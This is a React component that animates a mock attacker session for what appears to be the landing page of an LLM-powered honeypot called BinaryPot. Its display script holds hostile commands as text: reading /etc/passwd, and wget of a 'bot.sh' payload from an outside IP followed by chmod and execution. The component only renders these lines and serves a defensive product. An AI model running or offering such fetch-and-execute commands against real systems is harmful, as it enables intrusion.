import React, { useState, useEffect, useRef } from "react";
import "./HeroTerminal.css";

const heroLines = [
  { type: "sys", text: "Connected to BinaryPot v1.0.0 (LLM Engine: GPT-4)" },
  { type: "sys", text: "Recording session BP-02847 from 185.220.101.34 [RU]" },
  { type: "prompt", text: "root@victim-server:~# " },
  { type: "cmd", text: "whoami" },
  { type: "out", text: "root" },
  { type: "prompt", text: "root@victim-server:~# " },
  { type: "cmd", text: "cat /etc/passwd" },
  {
    type: "out",
    text:
      "root:x:0:0:root:/root:/bin/bash\n" +
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
  },
  { type: "prompt", text: "root@victim-server:~# " },
  {
    type: "cmd",
    text: "wget http://185.62.188.x/bot.sh -O /tmp/.x",
  },
  {
    type: "err",
    text:
      "--2024-01-15 03:47:12-- http://185.62.188.x/bot.sh\n" +
      "Connecting...connected. HTTP request sent, awaiting response... 200 OK",
  },
  { type: "prompt", text: "root@victim-server:~# " },
  { type: "cmd", text: "chmod +x /tmp/.x && /tmp/.x" },
  {
    type: "sys",
    text: "[LLM] Generating realistic response to maintain attacker engagement...",
  },
];

const HeroTerminal = () => {
  const [visibleLines, setVisibleLines] = useState([]);
  const [lineIndex, setLineIndex] = useState(0);
  const terminalRef = useRef(null);

  useEffect(() => {
    if (lineIndex >= heroLines.length) {
      const timeout = setTimeout(() => {
        setVisibleLines([]);
        setLineIndex(0);
      }, 3000);
      return () => clearTimeout(timeout);
    }

    const line = heroLines[lineIndex];
    let delay = 500;

    if (line.type === "prompt") delay = 800;
    if (line.type === "sys") delay = 200;

    const timeout = setTimeout(() => {
      setVisibleLines((prev) => [...prev, line]);
      setLineIndex((prev) => prev + 1);
    }, delay);

    return () => clearTimeout(timeout);
  }, [lineIndex]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop =
        terminalRef.current.scrollHeight;
    }
  }, [visibleLines]);

  return (
    <div className="heroTerminal">
      <div className="termHeader">
        <div className="termDots">
          <span className="dotR"></span>
          <span className="dotY"></span>
          <span className="dotG"></span>
        </div>
        <div className="termTitle">root@victim-server:~#</div>
      </div>

      <div className="termBody" ref={terminalRef}>
        {visibleLines.map((line, i) => (
          <div key={i} className={line.type}>
            {line.text}
            {line.type === "prompt" && (
              <span className="cursor"></span>
            )}
          </div>
        ))}
      </div>
    </div>
  );
};

export default HeroTerminal;